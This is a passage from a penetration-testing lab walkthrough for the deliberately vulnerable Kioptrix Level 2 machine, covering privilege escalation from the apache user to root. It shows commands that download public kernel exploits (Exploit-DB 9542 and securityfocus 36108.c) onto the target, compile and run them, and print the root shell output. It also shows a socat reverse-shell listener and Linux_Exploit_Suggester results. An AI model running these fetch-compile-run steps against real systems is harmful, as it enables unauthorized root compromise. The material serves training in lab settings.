<h3>3.13.3.3. Getting to root from apache<a class="headerlink" href="#getting-to-root-from-apache" title="Permalink to this headline">¶</a></h3>
<p>We’re just a local root exploit away from success. There are a few ways to search for root exploits:</p>
<ol class="arabic">
<li><p class="first"><strong class="program">searchsploit</strong> on Kali.</p>
<p>Run <code class="docutils literal"><span class="pre">searchsploit</span> <span class="pre">SEARCH</span> <span class="pre">TERMS</span></code> to get a list of possible exploits.</p>
</li>
<li><p class="first"><a class="reference external" href="https://www.exploit-db.com/search/">Exploit Database Search</a> to get an updated, online equivalent to <strong class="program">searchsploit</strong>.</p>
</li>
<li><p class="first"><a class="reference external" href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">PenturaLabs/Linux_Exploit_Suggester</a></p>
</li>
<li><p class="first">Search Google (my first hit for “linux kernel 2.6.9 root exploit” was a successful exploit)</p>
</li>
</ol>
<p>Here we illustrate the Google search and <strong class="program">Linux_Exploit_Suggester.pl</strong>.</p>
<div class="section" id="google-search-for-root-exploit">
<h4>3.13.3.3.1. Google search for root exploit<a class="headerlink" href="#google-search-for-root-exploit" title="Permalink to this headline">¶</a></h4>
<p>Searching for kernel 2.6.9 root exploits lead to <a class="reference external" href="https://www.exploit-db.com/exploits/9542/">Linux Kernel 2.6 &lt; 2.6.19 - (32-bit) ip_append_data() ring0 Root Exploit</a> (running on kioptrix2):</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
curl --silent --insecure --output <span class="m">9542</span>.c https://www.exploit-db.com/download/9542
dos2unix <span class="m">9542</span>.c
gcc <span class="m">9542</span>.c -o exploit9542
./exploit9542
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> socat - TCP-LISTEN:<span class="nv">$MYPORT</span>
<span class="go">bash: no job control in this shell</span>
<span class="go">bash-3.00$ cd /tmp</span>
<span class="go">curl --silent --insecure --output 9542.c https://www.exploit-db.com/download/9542</span>
<span class="go">bash-3.00$ dos2unix 9542.c</span>
<span class="go">dos2unix: converting file 9542.c to UNIX format ...</span>
<span class="go">bash-3.00$ gcc 9542.c -o exploit9542</span>
<span class="go">bash-3.00$ ./exploit9542</span>
<span class="go">sh: no job control in this shell</span>
<span class="gp">sh-3.00#</span> id
<span class="go">uid=0(root) gid=0(root) groups=48(apache)</span>
<span class="gp">sh-3.00#</span>
</pre></div>
</div>
<p>And we are root.</p>
</div>
<div class="section" id="linux-exploit-suggester-pl">
<h4>3.13.3.3.2. <strong class="program">Linux_Exploit_Suggester.pl</strong><a class="headerlink" href="#linux-exploit-suggester-pl" title="Permalink to this headline">¶</a></h4>
<p>Download and run <a class="reference external" href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">PenturaLabs/Linux_Exploit_Suggester</a>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent --insecure --remote-name <span class="se">\</span>
  https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
perl Linux_Exploit_Suggester.pl -k <span class="m">2</span>.6.9
</pre></div>
</div>
<p>This gets these suggestions:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> curl --silent --insecure --remote-name <span class="se">\</span>
&gt;   https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> perl Linux_Exploit_Suggester.pl -k <span class="m">2</span>.6.9

<span class="go">Kernel local: 2.6.9</span>

<span class="go">Searching among 65 exploits...</span>

<span class="go">Possible Exploits:</span>
<span class="go">[+] american-sign-language</span>
<span class="go">   CVE-2010-4347</span>
<span class="go">   Source: http://www.securityfocus.com/bid/45408/</span>
<span class="go">[+] exp.sh</span>
<span class="go">[+] half_nelson</span>
<span class="go">   Alt: econet    CVE-2010-3848</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/6851</span>
<span class="go">[+] half_nelson1</span>
<span class="go">   Alt: econet    CVE-2010-3848</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/17787/</span>
<span class="go">[+] half_nelson2</span>
<span class="go">   Alt: econet    CVE-2010-3850</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/17787/</span>
<span class="go">[+] half_nelson3</span>
<span class="go">   Alt: econet    CVE-2010-4073</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/17787/</span>
<span class="go">[+] krad</span>
<span class="go">[+] krad3</span>
<span class="go">   Source: http://exploit-db.com/exploits/1397</span>
<span class="go">[+] pktcdvd</span>
<span class="go">   CVE-2010-3437</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/15150/</span>
<span class="go">[+] py2</span>
<span class="go">[+] sock_sendpage</span>
<span class="go">   Alt: wunderbar_emporium    CVE-2009-2692</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/9435</span>
<span class="go">[+] sock_sendpage2</span>
<span class="go">   Alt: proto_ops    CVE-2009-2692</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/9436</span>
<span class="go">[+] udp_sendmsg_32bit</span>
<span class="go">   CVE-2009-2698</span>
<span class="go">   Source: http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c</span>
<span class="go">[+] video4linux</span>
<span class="go">   CVE-2010-3081</span>
<span class="go">   Source: http://www.exploit-db.com/exploits/15024/</span>
</pre></div>
</div>
<p>The suggestion udp_sendmsg_32bit worked:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">bash-3.00$ curl --silent --output 36108.c --insecure http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c</span>
<span class="go">bash-3.00$ gcc -o exploit36108 36108.c</span>
<span class="go">bash-3.00$ ./exploit36108</span>
<span class="go">sh: no job control in this shell</span>
<span class="gp">sh-3.00#</span> id
<span class="go">uid=0(root) gid=0(root) groups=48(apache)</span>
<span class="gp">sh-3.00#</span>
</pre></div>
</div>
<p>And we have root.</p>
</div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="kioptrix1.html" class="btn btn-neutral float-right" title="3.14. Kioptrix Level 1" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="kioptrix3.html" class="btn btn-neutral" title="3.12. Kioptrix Level 3" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>